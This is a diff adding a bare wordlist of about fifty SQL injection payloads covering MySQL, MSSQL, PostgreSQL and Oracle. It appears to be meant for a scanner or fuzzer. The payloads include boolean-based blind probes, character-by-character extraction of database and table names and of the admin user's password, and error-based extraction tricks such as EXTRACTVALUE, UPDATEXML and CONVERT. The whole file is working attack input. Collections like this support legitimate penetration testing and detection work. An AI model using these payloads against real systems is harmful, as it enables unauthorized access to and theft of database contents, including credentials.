@@ -1,0 +1,50 @@
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+1 AND 1=1
+1 AND 1=2
+' OR 1=1--
+' OR 1=2--
+') AND 1=1--
+') AND 1=2--
+' AND 1=1#
+' AND 1=2#
+' AND SUBSTRING(database(),1,1)='a'--
+' AND LENGTH(database())>1--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND ASCII(SUBSTRING(database(),1,1))>64--
+' AND ORD(MID(database(),1,1))>64--
+' AND SUBSTRING(DB_NAME(),1,1)='a'--
+' AND LEN(DB_NAME())>1--
+' AND (SELECT COUNT(*) FROM sysobjects WHERE xtype='U')>0--
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))>64--
+' AND SYSTEM_USER='sa'--
+' AND IS_SRVROLEMEMBER('sysadmin')=1--
+' AND SUBSTRING(current_database(),1,1)='a'--
+' AND LENGTH(current_database())>1--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+' AND (SELECT SUBSTRING(usename,1,1) FROM pg_user LIMIT 1)='p'--
+' AND current_user='postgres'--
+' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O'--
+' AND LENGTH((SELECT username FROM all_users WHERE ROWNUM=1))>1--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--
+' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND GTID_SUBSET(CONCAT(0x7e,database()),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,database())) USING utf8)))--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+' AND 1=CONVERT(int,DB_NAME())--
+' AND 1=CONVERT(int,SYSTEM_USER)--
+'; SELECT 1/0--
+' AND 1=CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns))--
+' AND 1=CAST((SELECT current_database()) AS int)--
+' AND 1=CAST(version() AS int)--
+' AND 1=CAST((SELECT usename FROM pg_user LIMIT 1) AS int)--
+' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
